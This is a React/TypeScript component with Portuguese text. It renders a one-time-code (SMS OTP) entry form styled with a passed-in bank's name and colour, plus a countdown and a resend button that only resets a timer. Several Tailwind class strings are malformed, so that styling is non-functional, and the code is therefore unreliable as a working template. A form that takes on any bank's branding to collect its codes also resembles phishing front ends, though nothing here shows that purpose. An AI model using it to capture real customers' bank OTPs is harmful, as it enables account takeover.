import React, { useState, useEffect } from 'react';
import { Smartphone, Shield, Clock, ArrowLeft } from 'lucide-react';
import { Bank } from '../types/bank';

interface OtpFormProps {
  bank: Bank;
  onSubmit: (otpCode: string) => void;
  onBack: () => void;
  isLoading: boolean;
  message?: string;
}

export const OtpForm: React.FC<OtpFormProps> = ({ 
  bank, 
  onSubmit, 
  onBack, 
  isLoading,
  message 
}) => {
  const [otpCode, setOtpCode] = useState('');
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otpCode.length >= 4) {
      onSubmit(otpCode);
    }
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  return (
    <div className="max-w-md p-6 mx-auto">
      <button
        onClick={onBack}
        className="flex items-center mb-6 text-gray-600 transition-colors hover:text-gray-800"
      >
        <ArrowLeft className="w-4 h-4 mr-2" />
        Voltar
      </button>

      <div className="mb-8 text-center">
        <div 
          className="flex items-center justify-center w-20 h-20 mx-auto mb-4 rounded-xl"
          style={{ backgroundColor: bank.primaryColor }}
        >
          <Smartphone className="w-10 h-10 text-white" />
        </div>
        <h2 className="mb-2 text-2xl font-bold text-gray-900">
          Verificação OTP
        </h2>
        <p className="text-gray-600">
          {bank.name}
        </p>
      </div>

      <div className="p-4 mb-6 border border-blue-200 rounded-lg bg-blue-50">
        <div className="flex items-start space-x-3">
          <Smartphone className="w-5 h-5 text-{{ backgroundColor: bank.primaryColor }} mt-0.5" />
          <div className="text-sm text-{{ backgroundColor: bank.primaryColor }}">
            <p className="mb-1 font-medium">Código de Verificação Enviado</p>
            <p>
              Verifique o seu telemóvel para o código SMS enviado pelo {bank.name}. 
              O código tem 4-6 dígitos.
            </p>
            {message && (
              <p className="mt-2 font-medium text-{{ backgroundColor: bank.primaryColor }}">{message}</p>
            )}
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        <div>
          <label htmlFor="otpCode" className="block mb-2 text-sm font-medium text-gray-700">
            Código de Verificação
          </label>
          <input
            type="text"
            id="otpCode"
            value={otpCode}
            onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
            className="w-full px-4 py-3 font-mono text-2xl tracking-widest text-center transition-all border border-gray-300 rounded-lg focus:ring-2 focus:ring-{{ backgroundColor: bank.primaryColor }} focus:border-transparent"
            placeholder="000000"
            maxLength={6}
            required
            autoComplete="one-time-code"
          />
          <p className="mt-1 text-xs text-center text-gray-500">
            Digite o código recebido por SMS
          </p>
        </div>

        <div className="flex items-center justify-center space-x-2 text-sm text-gray-600">
          <Clock className="w-4 h-4" />
          <span>Código expira em: {formatTime(timeLeft)}</span>
        </div>

        <button
          type="submit"
          disabled={otpCode.length < 4 || isLoading || timeLeft === 0}
          className="flex items-center justify-center w-full px-4 py-3 space-x-2 font-medium text-white transition-all duration-200 rounded-lg disabled:opacity-50 disabled:cursor-not-allowed"
          style={{ 
            backgroundColor: otpCode.length >= 4 && timeLeft > 0 ? bank.primaryColor : '#9CA3AF' 
          }}
        >
          {isLoading ? (
            <>
              <div className="w-5 h-5 border-2 border-white rounded-full border-t-transparent animate-spin" />
              <span>Verificando...</span>
            </>
          ) : (
            <>
              <Shield className="w-5 h-5" />
              <span>Verificar Código</span>
            </>
          )}
        </button>
      </form>

      <div className="mt-6 text-center">
        <button
          onClick={() => {
            // In a real app, this would resend the OTP
            setTimeLeft(300);
          }}
          className="text-sm text-blue-600 transition-colors hover:text-blue-800"
          disabled={timeLeft > 240} // Can only resend after 1 minute
        >
          {timeLeft > 240 ? 'Aguarde para reenviar' : 'Reenviar código'}
        </button>
      </div>
    </div>
  );
};